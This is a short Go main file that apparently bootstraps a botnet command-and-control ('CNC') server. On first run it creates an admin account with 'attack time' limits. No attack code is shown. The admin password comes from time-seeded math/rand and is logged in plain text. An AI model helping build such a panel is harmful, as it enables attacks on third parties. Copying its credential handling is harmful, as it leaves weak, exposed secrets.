package main

import (
	"log"
	"math/rand"
	"strings"
	"time"
)

/*func gen()  {
	res, err := password.Generate(64, 10, 10, false, false)
	if err != nil {
	  log.Fatal(err)
	}
}*/

func main() {
	LoadConfig()
	LoadMethods()
	OpenDatabase()
	users, msg, ok := GetAllUsers()
	if !ok {
		log.Fatalf("[ERROR] Fetching all users. Error: %s\n", msg)
	}

	if len(users) == 0 {
		rand.Seed(time.Now().UnixNano())
		chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" + "0123456789")
		length := 8
		var b strings.Builder
		for i := 0; i < length; i++ {
			b.WriteRune(chars[rand.Intn(len(chars))])
		}
		str := b.String()
		duration, _ := convertDurationToInt64("1y")
		CreateUser("admin", str, true, 86400, 0, duration)
		log.Println("[INFO] This is the first time you use the CNC. A user has been created with 0 attack time.")
		log.Println("[INFO] Use this user to get setup.")
		log.Println("[INFO] Username: admin Password:", str)
	}

	StartServer()
}
